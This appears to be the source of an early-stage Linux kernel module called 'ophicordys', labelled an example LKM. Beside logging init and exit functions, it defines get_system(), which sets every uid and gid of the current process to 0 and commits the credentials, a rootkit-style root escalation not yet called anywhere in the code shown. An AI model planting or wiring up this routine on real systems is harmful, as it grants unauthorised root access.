#include <linux/init.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

#include "ophicordys.h"

MODULE_AUTHOR("B1TC0R3");
MODULE_DESCRIPTION("Example LKM");
MODULE_LICENSE("GPL");

int get_system(void) {
    struct task_struct *current_task = get_current();
    struct cred* credentials = prepare_creds();
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    if (current_task == NULL || credentials == NULL) {
        return -1;
    }

    credentials->uid   = kuid;
    credentials->euid  = kuid;
    credentials->suid  = kuid;
    credentials->fsuid = kuid;

    credentials->gid   = kgid;
    credentials->egid  = kgid;
    credentials->sgid  = kgid;
    credentials->fsgid = kgid;

    commit_creds(credentials);
    return 0;
}

static int __init ophicordys_init(void) {
    int pid = task_pid_nr(current);
    printk(KERN_INFO "%s: module loaded (PID: %i).\n", THIS_MODULE->name, pid);
    return 0;
}

static void __exit ophicordys_exit(void) {
    printk(KERN_INFO "%s: module unloaded.\n", THIS_MODULE->name);
}

module_init(ophicordys_init);
module_exit(ophicordys_exit);
